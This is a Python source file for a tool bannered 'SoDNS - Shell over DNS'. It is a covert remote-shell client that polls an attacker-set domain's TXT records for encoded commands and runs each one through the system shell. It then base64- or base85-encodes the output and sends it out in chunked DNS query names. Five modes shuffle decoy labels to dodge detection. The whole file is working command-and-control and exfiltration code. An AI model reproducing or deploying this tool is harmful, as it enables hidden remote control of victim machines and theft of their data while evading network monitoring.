import pstats
import socket
import sys
import subprocess
import base64
import binascii
from tkinter import NO
from urllib import response
import dns.resolver
import time
import random
import shlex
from dns import name
import argparse
import string
from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, A

w_size = None
w_time = None
list_start = ["api","web", "test", "part", "health", "status"]
list_end = ["brave", "search", "bind", "info"]
list_mode = ["gateway","developer", "security", "public", "www", "dev"]
random_border = 10000


def print_banner():
    banner = """
   _____       ____  _   _______             _____ __         ____                           ____  _   _______
  / ___/____  / __ \/ | / / ___/            / ___// /_  ___  / / /  ____ _   _____  _____   / __ \/ | / / ___/
  \__ \/ __ \/ / / /  |/ /\__ \   ______    \__ \/ __ \/ _ \/ / /  / __ | | / / _ \/ ___/  / / / /  |/ /\__ \ 
 ___/ / /_/ / /_/ / /|  /___/ /  /_____/   ___/ / / / /  __/ / /  / /_/ | |/ /  __/ /     / /_/ / /|  /___/ / 
/____/\____/_____/_/ |_//____/            /____/_/ /_/\___/_/_/   \____/|___/\___/_/     /_____/_/ |_//____/  
                                                                                                              
    """
    print(banner)

def create_dns_query(domain, qtype):
    q = DNSQuestion(domain, qtype)
    request = DNSRecord(q=q)
    return request.pack()


def send_dns_query(host, port, query_data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.sendto(query_data, (host, port))
        data, addr = sock.recvfrom(1024)
        return data
    except Exception as e:
        print(f"Error: {e}")
        return None
    finally:
        sock.close()


def resolve_domain_with_default_dns(domain, qtype):
    try:
        resolver = dns.resolver.Resolver()
        resolver.cache = dns.resolver.LRUCache(0)
        resolver.nameservers = dns.resolver.get_default_resolver().nameservers
        resolver.lifetime = 1
        if qtype == QTYPE.TXT:
            answers = resolver.resolve(domain, 'TXT')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.A:
            answers = resolver.resolve(domain, 'A')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.MX:
            answers = resolver.resolve(domain, 'MX')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.CNAME:
            answers = resolver.resolve(domain, 'CNAME')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.NS:
            answers = resolver.resolve(domain, 'NS')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.SOA:
            answers = resolver.resolve(domain, 'SOA')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.PTR:
            answers = resolver.resolve(domain, 'PTR')
            return [str(rdata) for rdata in answers]
        elif qtype == QTYPE.AAAA:  # AAAA kaydı sorgusu
            answers = resolver.resolve(domain, 'AAAA')
            return [str(rdata) for rdata in answers]

        return []

    except Exception as e:
        return []

def parse_dns_response(response_data):
    try:
        response = DNSRecord.parse(response_data)
        answers = []
        for answer in response.rr:
            if answer.rtype == QTYPE.TXT:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.A:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.MX:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.CNAME:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.NS:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.SOA:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.PTR:
                answers.append(str(answer.rdata))
            elif answer.rtype == QTYPE.AAAA.value:
                answers.append(str(answer.rdata))                
        return answers
    except Exception as e:
        print(f"Error: {e}")
        return []

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True)
        return result.decode('utf-8', errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"Command Error: {e.stderr}"
    except Exception as e:
        return f"An unknown error occurred: {str(e)}"

def get_random_string():
    length = random.randint(1, 12)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def get_qtype_from_string1(qtype_str):
    qtype_mapping = {
        'A': dns.rdatatype.A,
        'AAAA': dns.rdatatype.AAAA,
        'CNAME': dns.rdatatype.CNAME,
        'TXT': dns.rdatatype.TXT
    }
    return qtype_mapping.get(qtype_str.upper(), dns.rdatatype.A)

def get_qtype_from_string(qtype_str):
    qtype_mapping = {
        'A': dns.rdatatype.A,
        'AAAA': dns.rdatatype.AAAA,
        'CNAME': dns.rdatatype.CNAME,
        'TXT': dns.rdatatype.TXT
    }
    if qtype_str.upper() == 'ALL':
        return [dns.rdatatype.A, dns.rdatatype.AAAA, dns.rdatatype.CNAME, dns.rdatatype.TXT]
    qtype_str = qtype_str.upper()
    qtype = qtype_mapping.get(qtype_str, None)
    if qtype is None:
        qtype = dns.rdatatype.A   
    return [qtype]

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Perform DNS queries and resolve commands.")
    parser.add_argument('-d', '--domain', required=True, help="Domain name to query.")
    parser.add_argument('-s', '--dns_server_ip', default=None, help="DNS server IP address.")
    parser.add_argument('-p', '--dns_server_port', type=int, default=None, help="DNS server port (default: 53).")
    parser.add_argument('-m', '--mode', type=int, choices=[1, 2, 3, 4, 5], default=1, help="Mode option (1, 2, 3, 4 or 5 default: 1).")
    parser.add_argument('-e', '--encode_type', choices=['base64', 'base85'], default="base64", help="Encoding type (default: base64).")
    parser.add_argument('-q','--q_type', choices=['A', 'AAAA', 'CNAME', 'TXT', 'ALL'], default='A', help="DNS query type (default: A).")
    parser.add_argument('-t', '--time', type=int, default=0, help="Waiting time to between DNS Queries (Default 0 sec).")
    parser.add_argument('-w', '--windows_size', type=int, default=63, help="Length of data to be carried in DNS query (1-63, default: 63).")
    args = parser.parse_args()
    
    domain = args.domain
    dns_server_ip = args.dns_server_ip
    dns_server_port = args.dns_server_port
    mode = args.mode
    encode_type = args.encode_type
    send_q_type = get_qtype_from_string(args.q_type) 
    qtype = QTYPE.TXT
    global w_time,w_size
    w_time = args.time
    w_size = args.windows_size
    print(f"Domain: {domain}")
    print(f"DNS Server IP: {dns_server_ip}")
    print(f"DNS Server Port: {dns_server_port}")
    print(f"Mode: {mode}")
    print(f"Encode Type: {encode_type}")
    print(f"Query Type: {send_q_type}")
    print(f"Windows Size : {w_size}")
    print(f"Time: {w_time}")
    
    base_t1_domain = f"t1.{domain}"
    processed_answers = set()

    while True:
        random_number = random.randint(1, 1000)
        t1_domain = f"{random_number}.{base_t1_domain}"
        if dns_server_ip:
            query_data = create_dns_query(t1_domain, qtype)
            response_data = send_dns_query(dns_server_ip, dns_server_port, query_data)
            if response_data:
                answers = parse_dns_response(response_data)
            else:
                answers = []
        else:
            answers = resolve_domain_with_default_dns(t1_domain, qtype)
        if answers:
            for answer in answers:          
                try:
                    decoded_command = decode_response(answer)
                    if decoded_command == "ready":
                        break
                    command_output = execute_command(decoded_command)
                    print(f"Command result: {command_output}")
                    send_iterative_a_query(command_output, dns_server_ip, dns_server_port, domain, q_type_list=send_q_type ,mode=mode, encode_type=encode_type)
                    processed_answers.add(answer) 
                except Exception as e:
                    print(f"Error: {e}")
        else:
            print("Not Recive TXT Reponse")
        time.sleep(5)

def send_a_query(dns_server_ip,dns_server_port,a_domain,q_type):
    time.sleep(w_time)
    if dns_server_ip:
        a_query_data = create_dns_query(a_domain, q_type)
        if dns_server_port:
            a_response_data = send_dns_query(dns_server_ip, dns_server_port, a_query_data)
        else:
            a_response_data = send_dns_query(dns_server_ip, 53, a_query_data)
            if a_response_data:
                a_answers = parse_dns_response(a_response_data)
                if a_answers:
                    for a_answer in a_answers:
                        pass
    else:
        a_answers = resolve_domain_with_default_dns(a_domain, q_type)
        if a_answers:
            for a_answer in a_answers:
                pass
                print(f"DNS Response: {a_answer}")
            else:
                pass
                print("DNS Response Not Found")


def base85_encoder(data):
    base85_encoded = base64.b85encode(data.encode('utf-8'))
    hex_encoded = base85_encoded.hex()
    return hex_encoded

def base64_encoder(data):
     return base64.b64encode(data.encode('utf-8')).decode('utf-8').rstrip("=")

def is_valid_dns_label(label):
    try:
        name.from_text(label)
    except name.LabelTooLong:
        return False
    return True 

def base64_decoder(encoded_str:str):
    try:
        padding = '=' * (4 - len(encoded_str) % 4)
        encoded_str += padding
        decoded_str = base64.b64decode(encoded_str).decode('utf-8')
    except (binascii.Error, UnicodeDecodeError) as e:
        print(f"Invalid base64 encoding for {encoded_str}: {e}")
        decoded_str = None
    return decoded_str

def send_iterative_a_query(output, dns_server_ip, dns_server_port, domain,q_type_list,mode=1, encode_type = "base64"):
    chunk_size = w_size
    encoded_output = None
    if encode_type == "base64":
        encoded_output = base64_encoder(output).replace("+", "-").replace("/", "_")
    elif encode_type == "base85":
        encoded_output = base85_encoder(output)
    chunks = [encoded_output[i:i + chunk_size] for i in range(0, len(encoded_output), chunk_size)]
    if is_valid_dns_label(encoded_output):
        a_domain = f"{random.randint(1, random_border)}.{encoded_output}.{random.choice(list_end)}.t1.{domain}"
        send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
    else:
        if mode == 1:
            print("Sending Result with Mode 1")
            #print(chunks)
            for index,chunk in enumerate(chunks, start=1):
                is_last = index == len(chunks)
                a_domain = None
                if is_last:
                    a_domain = f"{random.randint(1, random_border)}.{chunk}.{random.choice(list_end)}.t1.{domain}"
                else:
                    a_domain = f"{random.randint(1, random_border)}.{chunk}.{random.choice(list_start)}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            print("Sending completed")
        elif mode == 2:
            print("Sending Result with Mode 2")
            last_chunk = None
            last_pre_chunk = None
            if len(chunks) % 2 == 0:
                last_chunk = chunks.pop()
                last_pre_chunk = chunks.pop()
            else:
                 last_chunk = chunks.pop()
            for index in range(0, len(chunks), 2):
                chunk1 = chunks[index + 1]
                chunk2 = chunks[index]
                a_domain = f"{random.randint(1, random_border)}.{chunk1}.{chunk2}.{random.choice(list_mode)}.t1.{domain}"
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            if last_pre_chunk:
                a_domain = f"{random.randint(1, random_border)}.{last_pre_chunk}.{random.choice(list_start)}.t1.{domain}"
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            if last_chunk:
                a_domain = f"{random.randint(1, random_border)}.{last_chunk}.{random.choice(list_end)}.t1.{domain}"
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            print("Sending completed")

        elif mode == 3:
            print("Sending Result with Mode 3")
            for index,chunk in enumerate(chunks, start=1):
                is_last = index == len(chunks)
                a_domain = None
                if is_last:
                    a_domain = f"{random.randint(1, random_border)}.{chunk}.{random.choice(list_end)}.t1.{domain}"
                else:
                    a_domain = f"{get_random_string()}.{chunk}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            print("Sending completed")
        elif mode == 4:
            print("Sending Result with Mode 4")
            # random.data1.data2.t1.domain
            last_chunk = None
            last_pre_chunk = None
            if len(chunks) % 2 == 0:
                last_chunk = chunks.pop()
                last_pre_chunk = chunks.pop()
            else:
                 last_chunk = chunks.pop()
            for index in range(0, len(chunks), 2):
                chunk1 = chunks[index]
                chunk2 = chunks[index + 1]
                a_domain = f"{get_random_string()}.{chunk1}.{chunk2}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            if last_pre_chunk:
                a_domain = f"{get_random_string()}.{last_pre_chunk}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            if last_chunk:
                a_domain = f"{random.randint(1, random_border)}.{last_chunk}.{random.choice(list_end)}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            print("Sending completed")

        elif mode == 5:
            print("Sending Result with Mode 5")
            # random.data1.data2.data3.t1.domain
            #print("Mod Data", len(chunks))
            #print(chunks)
            last_chunk = None
            last_pre_chunk = None
            last_pre_chunk1 = None
            if len(chunks) % 3 == 0:
                last_chunk = chunks.pop()
                last_pre_chunk = chunks.pop()
                last_pre_chunk1 = chunks.pop()
            elif len(chunks) % 3 == 2:
                last_chunk = chunks.pop()
                last_pre_chunk = chunks.pop()
            else:
                 last_chunk = chunks.pop()
            for index in range(0, len(chunks), 3):
                chunk1 = chunks[index]
                chunk2 = chunks[index + 1]
                chunk3 = chunks[index + 2]
                a_domain = f"{get_random_string()}.{chunk1}.{chunk2}.{chunk3}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            if last_pre_chunk and last_pre_chunk1 :
                a_domain = f"{get_random_string()}.{last_pre_chunk1}.{last_pre_chunk}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            elif last_pre_chunk:
                a_domain = f"{get_random_string()}.{last_pre_chunk}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))                          
            if last_chunk:
                a_domain = f"{random.randint(1, random_border)}.{last_chunk}.{random.choice(list_end)}.t1.{domain}"
                #print(a_domain)
                send_a_query(dns_server_ip,dns_server_port,a_domain,q_type=random.choice(q_type_list))
            print("Sending completed")
   
def decode_response(response):
    try:
        # Önce base64 decode etmeyi dene
        decoded_response = base64.b64decode(response).decode('utf-8')
        return decoded_response
    except (binascii.Error, UnicodeDecodeError):
        try:
            # Base64 decode başarısız olduysa hex decode etmeyi dene
            decoded_response = bytes.fromhex(response.strip('"')).decode('utf-8')
            #decoded_response = binascii.unhexlify(response).decode('utf-8')
            return decoded_response
        except (binascii.Error, UnicodeDecodeError):
            # İkisi de başarısızsa, orijinal cevabı dön
            return response

if __name__ == "__main__":
    main()


    
